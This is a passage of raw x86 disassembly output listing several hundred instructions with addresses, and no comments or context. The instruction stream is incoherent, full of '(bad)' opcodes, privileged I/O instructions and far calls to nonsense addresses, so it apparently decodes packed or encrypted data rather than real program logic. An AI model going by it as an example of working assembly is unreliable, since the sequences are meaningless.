  41eec6:	shld   DWORD PTR [edx+ecx*2-0x52],ecx,0x87
  41eecc:	dec    ecx
  41eecd:	stc    
  41eece:	xchg   ecx,eax
  41eecf:	adc    al,0xc
  41eed1:	adc    ecx,DWORD PTR ds:0xa6dd2dd3
  41eed7:	jge    0x41ee95
  41eed9:	js     0x41ee9f
  41eedb:	mov    dh,0x71
  41eedd:	ds mov ah,0xa0
  41eee0:	mov    al,0x70
  41eee2:	xchg   DWORD PTR [ebp+0x193ba2c5],edi
  41eee8:	inc    ebx
  41eee9:	hlt    
  41eeea:	xlat   BYTE PTR ds:[ebx]
  41eeeb:	clc    
  41eeec:	push   esi
  41eeed:	push   0x24
  41eeef:	popf   
  41eef0:	dec    esi
  41eef1:	call   0x2658:0xa3c36d05
  41eef8:	fwait
  41eef9:	sub    dl,BYTE PTR [ebp-0x57827aec]
  41eeff:	cmp    DWORD PTR [eax],ecx
  41ef01:	inc    ebx
  41ef02:	jge    0x41ef11
  41ef04:	ins    BYTE PTR es:[edi],dx
  41ef05:	pop    es
  41ef06:	das    
  41ef07:	push   0xda234860
  41ef0c:	rcl    DWORD PTR [ecx+0x1e],cl
  41ef0f:	push   eax
  41ef10:	sbb    DWORD PTR [ecx-0x37],esp
  41ef13:	in     al,dx
  41ef14:	push   ebp
  41ef15:	push   ebx
  41ef16:	push   ecx
  41ef17:	scas   eax,DWORD PTR es:[edi]
  41ef18:	mov    eax,ds:0x7341e90f
  41ef1d:	or     DWORD PTR [ebx],ebx
  41ef1f:	pushf  
  41ef20:	dec    eax
  41ef21:	leave  
  41ef22:	add    eax,0xd914e3b7
  41ef27:	fs das 
  41ef29:	cmc    
  41ef2a:	arpl   WORD PTR [esi],di
  41ef2c:	sbb    ch,BYTE PTR [edi]
  41ef2e:	outs   dx,BYTE PTR ds:[esi]
  41ef2f:	lods   eax,DWORD PTR ds:[esi]
  41ef30:	sbb    DWORD PTR [ebx-0x28],edx
  41ef33:	mov    dh,0xc7
  41ef35:	enter  0x513,0xe3
  41ef39:	jno    0x41ef5d
  41ef3b:	and    al,BYTE PTR [esi+0x75697e61]
  41ef41:	pop    es
  41ef42:	sub    BYTE PTR [ebx],0xf5
  41ef45:	add    BYTE PTR [ecx],ch
  41ef47:	ret    0xbac6
  41ef4a:	shl    ch,0xcd
  41ef4d:	cmp    DWORD PTR [eax],0x5bc93f94
  41ef53:	ins    DWORD PTR es:[edi],dx
  41ef54:	xor    ebx,edi
  41ef56:	dec    esp
  41ef57:	adc    eax,esp
  41ef59:	push   eax
  41ef5a:	call   FWORD PTR [ebp+0x6]
  41ef5d:	jo     0x41ef64
  41ef5f:	adc    eax,DWORD PTR [ecx]
  41ef61:	sbb    DWORD PTR [esi],edi
  41ef63:	loopne 0x41ef2c
  41ef65:	into   
  41ef66:	xor    eax,0xb2242e90
  41ef6b:	cmp    DWORD PTR [ecx+ecx*2-0x7f],0xffffffd4
  41ef70:	mov    cl,0xe3
  41ef72:	adc    al,0x85
  41ef74:	or     DWORD PTR [edx],esi
  41ef76:	jl     0x41ef4c
  41ef78:	test   DWORD PTR ss:[esi+0x48],esp
  41ef7c:	or     ecx,DWORD PTR [esp+edx*4]
  41ef7f:	jo     0x41ef76
  41ef81:	sbb    edx,DWORD PTR [edx]
  41ef83:	lahf   
  41ef84:	and    BYTE PTR [edx*4-0x2c8a190c],dl
  41ef8b:	stc    
  41ef8c:	mov    WORD PTR [eax+edx*2-0x35304d07],fs
  41ef93:	mov    WORD PTR [ebp-0x23],?
  41ef96:	repz daa 
  41ef98:	add    esi,DWORD PTR [eax-0x61]
  41ef9b:	sub    al,0xab
  41ef9d:	das    
  41ef9e:	sub    al,0x4c
  41efa0:	mov    dh,bl
  41efa2:	jns    0x41ef29
  41efa4:	fdivr  DWORD PTR [eax+0x3fbecf38]
  41efaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efab:	fdiv   DWORD PTR [esi-0x10a7afa2]
  41efb1:	lahf   
  41efb2:	ja     0x41efdc
  41efb4:	test   DWORD PTR [ebx-0x155c5527],esp
  41efba:	retf   
  41efbb:	pop    ss
  41efbc:	push   esp
  41efbd:	pop    bx
  41efbf:	jb     0x41efcf
  41efc1:	and    eax,0x2f042908
  41efc6:	(bad)  
  41efc7:	out    0x1b,al
  41efc9:	adc    eax,0xa55c1b6
  41efce:	call   0xe948:0xd79560c3
  41efd5:	cmp    al,0xb0
  41efd7:	mov    ebp,0xb2683dd7
  41efdc:	test   eax,0x369e56f8
  41efe1:	popa   
  41efe2:	sbb    ebx,esi
  41efe4:	pop    ebp
  41efe5:	xor    BYTE PTR [ebx+0x28],0x3c
  41efe9:	jecxz  0x41f01b
  41efeb:	add    al,0x6f
  41efed:	(bad)  
  41efee:	xor    ecx,DWORD PTR [esp+edi*2-0x27]
  41eff2:	jb     0x41efab
  41eff4:	dec    ecx
  41eff5:	cli    
  41eff6:	in     eax,dx
  41eff7:	or     DWORD PTR [ebx-0x53],ecx
  41effa:	(bad)  
  41effb:	xor    al,0xa6
  41effd:	pop    ebx
  41effe:	shl    BYTE PTR [edx],cl
  41f000:	cmp    cl,ah
  41f002:	aad    0xa2
  41f004:	jbe    0x41f07a
  41f006:	add    BYTE PTR [edx-0x59],cl
  41f009:	sub    edi,DWORD PTR [esi]
  41f00b:	ja     0x41f032
  41f00d:	inc    ecx
  41f00e:	sbb    BYTE PTR [eax-0x7c0939e9],0x94
  41f015:	xchg   esp,eax
  41f016:	sahf   
  41f017:	into   
  41f018:	stos   DWORD PTR es:[edi],eax
  41f019:	fcmovu st,st(4)
  41f01b:	xor    DWORD PTR [eax+0x54],eax
  41f01e:	xor    cl,BYTE PTR [ebx+0x54366aa0]
  41f024:	dec    esi
  41f025:	inc    edx
  41f026:	ret    
  41f027:	lea    esi,[edx+0x1b]
  41f02a:	rcl    ch,cl
  41f02c:	pop    esi
  41f02d:	pop    esp
  41f02e:	and    DWORD PTR [edx+0x3],edx
  41f031:	les    ebx,FWORD PTR [edx+ebx*2+0x387f926d]
  41f038:	(bad)  
  41f039:	loop   0x41f013
  41f03b:	mov    edx,0xdf80e87f
  41f040:	cmc    
  41f041:	push   esi
  41f042:	div    BYTE PTR [ebx+0x148ce134]
  41f048:	xchg   ebx,eax
  41f049:	push   esi
  41f04a:	mov    ds:0x73844d71,al
  41f04f:	pop    eax
  41f050:	inc    edx
  41f051:	jnp    0x41f013
  41f053:	inc    edx
  41f054:	xor    BYTE PTR [ebp-0x5f],ah
  41f057:	xor    eax,0x77c91a0e
  41f05c:	stos   DWORD PTR es:[edi],eax
  41f05d:	push   ecx
  41f05e:	push   0x75c796f
  41f063:	push   ebx
  41f064:	dec    ecx
  41f065:	fcom   QWORD PTR [di]
  41f068:	inc    edi
  41f069:	push   0x8852ee03
  41f06e:	xor    BYTE PTR [ecx+0x35],dh
  41f071:	inc    ebp
  41f072:	fstp   DWORD PTR [ebp+0x1a]
  41f075:	aas    
  41f076:	add    bh,dh
  41f078:	rcr    BYTE PTR [edi],cl
  41f07a:	mov    ebp,0x6a4a192d
  41f07f:	dec    edi
  41f080:	xor    DWORD PTR [esp+edi*8-0x14],edx
  41f084:	xchg   edx,eax
  41f085:	xchg   ebx,eax
  41f086:	cdq    
  41f087:	push   0xd0ab3224
  41f08c:	inc    ebx
  41f08d:	dec    ebp
  41f08e:	and    eax,0xb541c479
  41f093:	(bad)  
  41f094:	iret   
  41f095:	mov    WORD PTR [eax+eax*2+0x14],cs
  41f099:	jo     0x41f07b
  41f09b:	(bad)  
  41f09c:	outs   dx,BYTE PTR ds:[esi]
  41f09d:	push   ds
  41f09e:	push   ebx
  41f09f:	scas   al,BYTE PTR es:[edi]
  41f0a0:	lahf   
  41f0a1:	push   es
  41f0a2:	cmp    eax,0xd6e92b4c
  41f0a7:	push   esp
  41f0a8:	sahf   
  41f0a9:	or     dh,BYTE PTR [ecx]
  41f0ab:	jle    0x41f09d
  41f0ad:	(bad)  
  41f0af:	(bad)  
  41f0b1:	mov    eax,0xc2fa6664
  41f0b6:	and    esi,esi
  41f0b8:	test   BYTE PTR [ebx],ch
  41f0ba:	arpl   WORD PTR [esi+0x5f],ax
  41f0bd:	pusha  
  41f0be:	adc    bh,BYTE PTR [esi-0x30d05b6a]
  41f0c4:	push   ecx
  41f0c5:	addr16 icebp 
  41f0c7:	jne    0x41f0d9
  41f0c9:	dec    ecx
  41f0ca:	pop    es
  41f0cb:	mov    ds:0x2f12dbf3,eax
  41f0d0:	iret   
  41f0d1:	and    DWORD PTR [ecx],0x45
  41f0d4:	outs   dx,DWORD PTR ds:[esi]
  41f0d5:	icebp  
  41f0d6:	bound  edi,QWORD PTR [ebp+eax*8-0x795ec0a0]
  41f0dd:	js     0x41f136
  41f0df:	leave  
  41f0e0:	or     eax,0xcd8bfb9c
  41f0e5:	mov    ebp,DWORD PTR [esi+0x4]
  41f0e8:	je     0x41f154
  41f0ea:	in     eax,dx
  41f0eb:	in     al,0x87
  41f0ed:	mov    eax,0xdf1448d5
  41f0f2:	xchg   ecx,eax
  41f0f3:	lods   al,BYTE PTR ds:[esi]
  41f0f4:	loope  0x41f0b9
  41f0f6:	cmp    cl,cl
  41f0f8:	bound  esi,QWORD PTR [eax+eax*4+0x4cd38d32]
  41f0ff:	or     edx,0x58
  41f102:	popf   
  41f103:	xor    ch,0xa0
  41f106:	inc    ebx
  41f107:	push   ecx
  41f108:	imul   esp,DWORD PTR [edx],0x2d708feb
  41f10e:	sub    eax,0xc071513
  41f113:	dec    ebx
  41f114:	jge    0x41f140
  41f116:	mov    cl,0x18
  41f118:	lahf   
  41f119:	xor    al,0xdb
  41f11b:	jns    0x41f0f5
  41f11d:	pop    ecx
  41f11e:	xor    DWORD PTR [ebp+edx*1-0x7ed585e4],0xfffffff4
  41f126:	(bad)  
  41f127:	adc    dh,ah
  41f129:	out    0x56,al
  41f12b:	sbb    DWORD PTR [edi],ebx
  41f12d:	xchg   ecx,eax
  41f12e:	sahf   
  41f12f:	pop    ebp
  41f130:	mov    ss,WORD PTR [ebp-0x5c5cdef5]
  41f136:	sbb    al,0x1
  41f138:	push   ebp
  41f139:	mov    gs,WORD PTR [ecx]
  41f13b:	or     BYTE PTR [edi+0x44],0xfb
  41f13f:	stc    
  41f140:	std    
  41f141:	int3   
  41f142:	je     0x41f0ec
  41f144:	cmp    eax,0xc767cfaa
  41f149:	push   edx
  41f14a:	scas   eax,DWORD PTR es:[edi]
  41f14b:	sub    DWORD PTR [esp+esi*1],edi
  41f14e:	xchg   esp,eax
  41f14f:	(bad)  [esi]
  41f151:	ret    0xe037
  41f154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f155:	jg     0x41f1a9
  41f157:	pop    ecx
  41f158:	cmp    eax,0x7e904927
  41f15d:	ja     0x41f18e
  41f15f:	ja     0x41f109
  41f161:	shl    DWORD PTR [ebx-0x71b8bf02],1
  41f167:	add    esp,0x6f811e3c
  41f16d:	leave  
  41f16e:	aas    
  41f16f:	nop
  41f170:	enter  0xef4d,0x63
  41f174:	mov    esp,0x62b7bf12
  41f179:	cmp    DWORD PTR [ecx],esp
  41f17b:	js     0x41f1d2
  41f17d:	xor    al,0xe6
  41f17f:	xchg   esp,eax
  41f180:	jmp    0xfd1c3e55
  41f185:	sbb    ebp,0xfffffffb
  41f188:	sub    ebp,ecx
  41f18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f18b:	xchg   edi,eax
  41f18c:	pop    ecx
  41f18d:	pop    ds
  41f18e:	mov    ebp,DWORD PTR ds:0xfa6d19ee
  41f194:	ss pop ebx
  41f196:	mov    ds:0xdc210e83,eax
  41f19b:	shl    DWORD PTR [edi],cl
  41f19d:	push   edi
  41f19e:	inc    esp
  41f19f:	into   
  41f1a0:	cmovns eax,eax
  41f1a3:	ds push ebx
  41f1a5:	pop    bp
  41f1a7:	aaa    
  41f1a8:	mov    dh,0x4b
  41f1aa:	inc    edi
  41f1ab:	jae    0x41f21a
  41f1ad:	in     al,dx
  41f1ae:	push   ebx
  41f1af:	loopne 0x41f1b4
  41f1b1:	mov    fs,WORD PTR [edx-0x6d190180]
  41f1b7:	(bad)  
  41f1b8:	and    DWORD PTR [ecx+0x28554637],esp
  41f1be:	out    0xa8,eax
  41f1c0:	dec    ebp
  41f1c1:	ins    BYTE PTR es:[edi],dx
  41f1c2:	push   ds
  41f1c3:	mov    dl,0x58
  41f1c5:	add    BYTE PTR ds:0xea62c7c6,bl
  41f1cb:	jbe    0x41f14f
  41f1cd:	and    DWORD PTR [ebx+ebx*1+0x2ff4cbf6],ebp
  41f1d4:	mov    al,0x9a
  41f1d6:	loope  0x41f15a
  41f1d8:	add    DWORD PTR [esi-0x6c387264],ebp
  41f1de:	mov    dl,0xdf
  41f1e0:	xchg   ecx,eax
  41f1e1:	inc    edx
  41f1e2:	sbb    eax,0x25ac0d09
  41f1e7:	scas   eax,DWORD PTR es:[edi]
  41f1e8:	sub    ebp,DWORD PTR [eax+0x78c33e9]
  41f1ee:	inc    edx
  41f1ef:	int    0x5a
  41f1f1:	retf   0x4a0
  41f1f4:	retf   0xd21b
  41f1f7:	test   al,0xc4
  41f1f9:	(bad)  
  41f1fa:	jnp    0x41f18a
  41f1fc:	xor    dh,bh
  41f1fe:	mov    ?,WORD PTR [esi+0x5215eec8]
  41f204:	pop    ds
  41f205:	pop    esp
  41f206:	cmp    dh,BYTE PTR [ecx]
  41f208:	test   al,0xe6
  41f20a:	add    eax,0xca247f97
  41f20f:	cmp    ebp,DWORD PTR [ebx+0x6e0d418e]
  41f215:	or     esi,DWORD PTR [eax]
  41f217:	rcr    DWORD PTR [esi],cl
  41f219:	xchg   edi,eax
  41f21a:	xor    ebx,DWORD PTR [ebx+0x2]
  41f21d:	lahf   
  41f21e:	dec    ebp
  41f21f:	inc    edx
  41f220:	adc    al,0x46
  41f222:	(bad)  
  41f223:	cwde   
  41f224:	dec    ebx
  41f225:	int3   
  41f226:	sub    eax,0x9444ebc1
  41f22b:	jbe    0x41f29e
  41f22d:	ins    BYTE PTR es:[edi],dx
  41f22e:	fcmovb st,st(1)
  41f230:	jbe    0x41f261
  41f232:	pop    es
  41f233:	pop    ds
  41f234:	mov    bh,0xd
  41f236:	mov    al,BYTE PTR [edi-0x31]
  41f239:	add    cl,ah
  41f23b:	adc    eax,0x7672a98f
  41f240:	jne    0x41f2ac
  41f242:	push   ebx
  41f243:	adc    ecx,DWORD PTR [ebx-0x1d]
  41f246:	ficomp WORD PTR ds:[ecx]
  41f249:	in     al,dx
  41f24a:	xlat   BYTE PTR ds:[ebx]
  41f24b:	retf   0x5b28
  41f24e:	in     eax,0xad
  41f250:	push   ss
  41f251:	adc    eax,0xc2bda578
  41f256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f257:	inc    esi
  41f258:	fmul   st(0),st
  41f25a:	push   eax
  41f25b:	xchg   ebx,eax
  41f25c:	imul   edi,ecx,0x7486c594
  41f262:	or     ch,BYTE PTR [ebx+0x2bf20d8c]
  41f268:	pop    ss
  41f269:	inc    edx
  41f26a:	ins    BYTE PTR es:[edi],dx
  41f26b:	cmp    bh,al
  41f26d:	call   0x33702638
  41f272:	xor    BYTE PTR [esi],dh
  41f274:	or     dh,bh
  41f276:	jno    0x41f277
  41f278:	pop    ebx
  41f279:	jbe    0x41f2c0
  41f27b:	inc    esp
  41f27c:	mov    ebp,esp
  41f27e:	fwait
  41f27f:	sub    al,0xb7
  41f281:	or     eax,0x4f0481c7
  41f286:	pushf  
  41f287:	pop    esp
  41f288:	push   eax
  41f289:	fidivr WORD PTR [edx+0x54]
  41f28c:	jbe    0x41f2c7
  41f28e:	inc    esp
  41f28f:	repz mov ch,0x22
  41f292:	pop    esp
  41f293:	adc    BYTE PTR [edi-0x3110a],ch
  41f299:	inc    eax
  41f29a:	inc    edi
  41f29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f29c:	test   DWORD PTR [ebp+edx*1-0x1d],ecx
  41f2a0:	add    dh,dh
  41f2a2:	and    eax,0xa168c106
  41f2a7:	inc    edx
  41f2a8:	lods   eax,DWORD PTR ds:[esi]
  41f2a9:	sete   BYTE PTR [ebx+0x4fc3e742]
  41f2b0:	inc    eax
  41f2b1:	scas   al,BYTE PTR es:[edi]
  41f2b2:	and    ebx,edx
  41f2b4:	jbe    0x41f263
  41f2b6:	sbb    DWORD PTR [ebx-0x12],0xb6a72130
  41f2bd:	mov    ebp,0x7e014aae
  41f2c2:	push   ebp
  41f2c3:	adc    edx,DWORD PTR [edi]
  41f2c5:	int3   
  41f2c6:	fcomp  QWORD PTR [esi+0x409bc882]
  41f2cc:	cmp    eax,0xf8ba759
  41f2d1:	into   
  41f2d2:	sub    eax,ebp
  41f2d4:	mov    edx,0x2b676357
  41f2d9:	adc    BYTE PTR [edx+0x7b7e33da],0x1
  41f2e0:	xchg   DWORD PTR ds:0x7d40989b,eax
  41f2e6:	mov    eax,ds:0xe053b516
  41f2eb:	pop    ecx
  41f2ec:	mov    edx,DWORD PTR [ebx+ebx*2-0x743b50ff]
  41f2f3:	mov    edx,0xd92dd50a
  41f2f8:	cmp    DWORD PTR [esi+esi*2+0x37],eax
  41f2fc:	mov    ebx,0xfa3d6dec
  41f301:	inc    ecx
  41f302:	lahf   
  41f303:	clc    
  41f304:	ret    0xf74b
  41f307:	inc    ebx
  41f308:	jno    0x41f37c
  41f30a:	pop    es
  41f30b:	sti    
  41f30c:	cdq    
  41f30d:	fcom   QWORD PTR [eax]
  41f30f:	mov    ebx,0x9e677f40
  41f314:	jne    0x41f352
  41f316:	pushf  
  41f317:	xchg   edi,eax
  41f318:	std    
  41f319:	or     eax,0x93a5eb23
  41f31e:	fnstenv [ebx-0x33]
  41f321:	or     al,0x4f
  41f323:	ret    
  41f324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f325:	cmp    ebp,DWORD PTR [eax]
  41f327:	(bad)  
  41f328:	and    DWORD PTR [esi+0x3e],ecx
  41f32b:	stc    
  41f32c:	dec    ebp
  41f32d:	add    al,BYTE PTR [eax-0x55]
  41f330:	cmp    al,0x8b
  41f332:	dec    edi
  41f333:	adc    eax,0x52
  41f336:	inc    ebp
  41f337:	cmc    
  41f338:	mov    edi,0xbbb73fea
  41f33d:	push   es
  41f33e:	stc    
  41f33f:	lods   eax,DWORD PTR ds:[esi]
  41f340:	lea    esi,[esi+0x2c30059]
  41f346:	dec    ebp
  41f347:	std    
  41f348:	fisttp WORD PTR es:[edi+0x2ea2ca8f]
  41f34f:	jmp    0xf159528f
  41f354:	sbb    bh,dh
  41f356:	xchg   edx,eax
  41f357:	or     edx,edi
  41f359:	sbb    BYTE PTR [ebx-0x62],ch
  41f35c:	stos   DWORD PTR es:[edi],eax
  41f35d:	test   eax,0x98ad1f02
  41f362:	mov    ebx,0xfa9986
  41f367:	or     al,0xc
  41f369:	mov    dl,0x9b
  41f36b:	and    cl,dh
  41f36d:	cmp    ebx,DWORD PTR [edx+0x75]
  41f370:	push   edi
  41f371:	int    0xe8
  41f373:	mov    eax,DWORD PTR ds:0x23c7e90d
  41f379:	mov    WORD PTR ds:0x5ea35056,?
  41f37f:	lea    edi,ds:0xf82368e
  41f385:	sbb    al,0x68
  41f387:	cli    
  41f388:	xchg   bl,dh
  41f38a:	rol    cl,1
  41f38c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f38d:	gs jecxz 0x41f3a4
  41f390:	cmp    BYTE PTR [ebx*8+0x4137bd9a],cl
  41f397:	cmp    BYTE PTR [edi+0x1027ccb6],al
  41f39d:	dec    ebx
  41f39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f39f:	scas   eax,DWORD PTR es:[edi]
  41f3a0:	jno    0x41f3ba
  41f3a2:	mov    dh,BYTE PTR [edi-0x8a03bff]
  41f3a8:	xor    dl,BYTE PTR [ebp-0x7759a42c]
  41f3ae:	iret   
  41f3af:	push   edi
  41f3b0:	mov    al,ds:0x350345a3
  41f3b5:	dec    edx
  41f3b6:	pop    edx
  41f3b7:	rcr    esi,0xc7
  41f3ba:	dec    ebx
  41f3bb:	push   edi
  41f3bc:	imul   esp,DWORD PTR [eax-0x453670],0xb6f8f263
  41f3c6:	int    0x27
  41f3c8:	pop    edi
  41f3c9:	aam    0xde
  41f3cb:	lock mov ds:0x4e07f4bb,eax
  41f3d1:	and    eax,0x2eec9fc6
  41f3d6:	popf   
  41f3d7:	mov    edi,0xbc20ca28
  41f3dc:	mov    fs,esp
  41f3de:	bound  eax,QWORD PTR ds:0xe29e2be3
  41f3e4:	adc    al,0xf4
  41f3e6:	sahf   
  41f3e7:	test   BYTE PTR [eax+0xf3e7865],ah
  41f3ed:	or     al,0xdb
  41f3ef:	pop    edi
  41f3f0:	cwde   
  41f3f1:	push   0xea81e919
  41f3f6:	hlt    
  41f3f7:	je     0x41f40f
  41f3f9:	retf   0x1bb3
  41f3fc:	pop    eax
  41f3fd:	call   0x7db39599
  41f402:	inc    esi
  41f403:	and    ebp,esp
  41f405:	cs int 0xd3
  41f408:	jne    0x41f410
  41f40a:	mov    eax,ds:0x8c31c7b9
  41f40f:	mov    dl,0x9c
  41f411:	mov    bl,0x4
  41f413:	int3   
  41f414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f415:	cwde   
  41f416:	cmp    al,bh
  41f418:	xchg   ecx,eax
  41f419:	shl    esp,cl
  41f41b:	add    DWORD PTR [edi],edi
  41f41d:	imul   esi,esp,0xd8534fc5
  41f423:	data16 mov dh,0x87
  41f426:	in     eax,dx
  41f427:	es sbb eax,0x7965047e
  41f42d:	xchg   ecx,eax
  41f42e:	loopne 0x41f3b3
  41f430:	dec    edi
  41f431:	cwde   
  41f432:	cs sti 
  41f434:	dec    esi
  41f435:	add    DWORD PTR [di+0x61],esi
  41f439:	mov    DWORD PTR [edx],esi
  41f43b:	push   ds
  41f43c:	push   esp
  41f43d:	cmc    
  41f43e:	add    DWORD PTR [ebx+ecx*8],ebp
  41f441:	mov    bh,0x76
  41f443:	int3   
  41f444:	jae    0x41f4c5
  41f446:	cdq    
  41f447:	cmp    edx,DWORD PTR [esi+0x375f7b84]
  41f44d:	xor    dl,BYTE PTR [ecx-0x5b]
  41f450:	ror    DWORD PTR [eax-0x70],cl
  41f453:	adc    eax,DWORD PTR [eax-0x64]
  41f456:	xchg   ebp,eax
  41f457:	sti    
  41f458:	repz stc 
  41f45a:	or     BYTE PTR [ecx],ch
  41f45c:	mov    eax,0x476a9256
  41f461:	mov    edi,0xc4789d8b
  41f466:	(bad)  
  41f467:	imul   ebx,DWORD PTR [esi+0x1b],0xfffffff1
  41f46b:	add    al,0xb
  41f46d:	into   
  41f46e:	and    DWORD PTR ds:0x3bc7b00a,ebx
  41f474:	call   0x68e2:0x28673a35
  41f47b:	jle    0x41f408
  41f47d:	mov    esp,0xddfff23a
  41f483:	push   es
  41f484:	push   esp
  41f485:	aam    0x8b
  41f487:	inc    esp
  41f488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f489:	nop
  41f48a:	dec    esi
  41f48b:	mov    al,ds:0x739f2f97
  41f490:	adc    ah,BYTE PTR [edx+0x70]
  41f493:	outs   dx,DWORD PTR ds:[esi]
  41f494:	sub    BYTE PTR [ecx-0x38769c55],0x80
  41f49b:	lock dec esi
  41f49d:	push   ebx
  41f49e:	and    BYTE PTR [ecx-0x15],ah
  41f4a1:	push   edx
  41f4a2:	mov    DWORD PTR [edx+ebp*4+0x1],0xa4c4eb69
  41f4aa:	mul    BYTE PTR [eax]
  41f4ac:	popf   
  41f4ad:	(bad)  
  41f4ae:	sub    eax,0xcdd1bf8d
  41f4b3:	inc    ebp
  41f4b4:	repz aaa 
  41f4b6:	mov    ebx,DWORD PTR [esp+ecx*4-0x6f]
  41f4ba:	push   ecx
  41f4bb:	dec    edi
  41f4bc:	aad    0x86
  41f4be:	jbe    0x41f48b
  41f4c0:	lds    edi,FWORD PTR [esp+edi*8-0x66]
  41f4c4:	add    DWORD PTR [ebx-0x32],ecx
  41f4c7:	push   ds
  41f4c8:	stos   BYTE PTR es:[edi],al
  41f4c9:	and    eax,0x95487149
  41f4ce:	loop   0x41f4f0
  41f4d0:	pop    ss
  41f4d1:	add    al,0x6d
  41f4d3:	jecxz  0x41f53d
  41f4d5:	cmc    
  41f4d6:	xor    DWORD PTR [esi+0x3e],esp
  41f4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4dc:	jecxz  0x41f4be
  41f4de:	pop    ecx
  41f4df:	loop   0x41f523
  41f4e1:	mov    ebx,0x718b416b
  41f4e6:	jecxz  0x41f517
  41f4e8:	int3   
  41f4e9:	jmp    0x2fb9:0x19a58ee5
  41f4f0:	dec    ebx
  41f4f1:	(bad)  
  41f4f2:	lds    esp,FWORD PTR [eax]
  41f4f4:	or     eax,0x7506cedf
  41f4f9:	mov    bl,0x7e
  41f4fb:	jns    0x41f55e
  41f4fd:	clc    
  41f4fe:	daa    
  41f4ff:	push   es
  41f500:	inc    esi
  41f501:	mov    eax,ds:0x7d5847f9
  41f506:	push   ss
  41f507:	inc    ebx
  41f508:	lahf   
  41f509:	mov    cl,0x98
  41f50b:	mov    dl,0x27
  41f50d:	iret   
  41f50e:	mov    edi,0x6360817a
  41f513:	xor    ecx,ebp
  41f515:	mov    ecx,0x21d6515a
  41f51a:	push   ebp
  41f51b:	sahf   
  41f51c:	inc    esi
  41f51d:	arpl   WORD PTR [esi],di
  41f51f:	jg     0x41f4b4
  41f521:	xchg   ebp,eax
  41f522:	aas    
  41f523:	inc    esp
  41f524:	sbb    BYTE PTR [edx-0x8],dh
  41f527:	(bad)  
  41f528:	cli    
  41f529:	add    ebp,DWORD PTR [eax-0x52]
  41f52c:	or     edi,DWORD PTR [esi-0x37]
  41f52f:	and    bl,BYTE PTR [esi+0x60]
  41f532:	aas    
  41f533:	sar    BYTE PTR [ecx],1
  41f535:	mov    eax,ds:0x4e8aec5c
  41f53a:	lds    ecx,FWORD PTR [edi-0x37e122bb]
  41f540:	push   ecx
  41f541:	xor    BYTE PTR ds:0x9d873433,0xf3
  41f548:	repnz cmp dl,dl
  41f54b:	ds in  al,dx
  41f54d:	shr    BYTE PTR [edx],0x11
  41f550:	cdq    
  41f551:	stc    
  41f552:	inc    edi
  41f553:	retf   
  41f554:	xchg   ebp,eax
  41f555:	cs xor ah,al
  41f558:	dec    esp
  41f559:	or     al,0x48
  41f55b:	inc    edx
  41f55c:	mov    ch,ah
  41f55e:	sub    eax,0x7287fff4
  41f563:	mov    ebp,0xefa1ceb
  41f568:	and    DWORD PTR [ebx+0xd],0xc8019b7c
  41f56f:	shr    DWORD PTR [ebx-0x3],cl
  41f572:	cmp    al,0x88
  41f574:	ins    DWORD PTR es:[edi],dx
  41f575:	mov    eax,ds:0x414da29b
  41f57a:	cld    
  41f57b:	sbb    ch,dh
  41f57d:	mov    cl,0x1d
  41f57f:	test   BYTE PTR [ebp-0x282a29b5],0x74
  41f586:	sbb    BYTE PTR [esi-0x3a],cl
  41f589:	pop    edi
  41f58a:	loop   0x41f5f2
  41f58c:	aaa    
  41f58d:	arpl   WORD PTR ds:[esp+esi*4+0x3839e713],si
  41f595:	dec    ecx
  41f596:	pusha  
  41f597:	adc    DWORD PTR [ecx],edi
  41f599:	in     al,dx
  41f59a:	outs   dx,DWORD PTR ds:[esi]
  41f59b:	pop    eax
  41f59c:	enter  0x7c9c,0x3a
  41f5a0:	inc    edx
  41f5a1:	bndldx (bad),[ebx+0xf]
  41f5a5:	add    al,0x56
  41f5a7:	ins    DWORD PTR es:[edi],dx
  41f5a8:	mov    DWORD PTR [eax],0xf1e4c25f
  41f5ae:	xchg   ebp,eax
  41f5af:	sbb    BYTE PTR [esp+eiz*4],ah
  41f5b2:	sub    DWORD PTR [eax-0x301cfe19],esp
  41f5b8:	mov    edx,0x46ca63ea
  41f5bd:	inc    esp
  41f5be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5bf:	enter  0xfa91,0x2a
  41f5c3:	jl     0x41f5cb
  41f5c5:	mov    ebx,0x1acfa23f
  41f5ca:	call   0xf44e:0x7bafcd43
  41f5d1:	mov    ds:0x53088a10,eax
  41f5d6:	cs ds loop 0x41f56b
  41f5da:	push   0xffffff86
  41f5dc:	loope  0x41f634
  41f5de:	sub    BYTE PTR [ecx-0x5a],bl
  41f5e1:	ins    BYTE PTR es:[edi],dx
  41f5e2:	or     ch,0x5d
  41f5e5:	scas   al,BYTE PTR es:[edi]
  41f5e6:	sbb    dl,BYTE PTR [eax-0x77]
  41f5e9:	popa   
  41f5ea:	enter  0x6012,0x36
  41f5ee:	jge    0x41f64f
  41f5f0:	mov    ecx,DWORD PTR [edi+0x15972b4c]
  41f5f6:	xchg   ebx,eax
  41f5f7:	ficomp DWORD PTR [ebx]
  41f5f9:	mov    eax,fs
  41f5fb:	add    eax,0xb8253760
  41f600:	inc    ebx
  41f601:	in     al,0x51
  41f603:	out    dx,eax
  41f604:	mov    ds:0xe207dedc,al
  41f609:	pop    DWORD PTR [ebx-0x2b]
  41f60c:	xchg   DWORD PTR [ebp-0x6e32fc5f],ecx
  41f612:	mov    eax,0xc7cf6a58
  41f617:	ds (bad) 
  41f619:	pop    ecx
  41f61a:	fwait
  41f61b:	inc    eax
  41f61c:	inc    eax
  41f61d:	cmp    DWORD PTR [ecx],ebp
  41f61f:	cmc    
  41f620:	fwait
  41f621:	ins    DWORD PTR es:[edi],dx
  41f622:	sub    bh,al
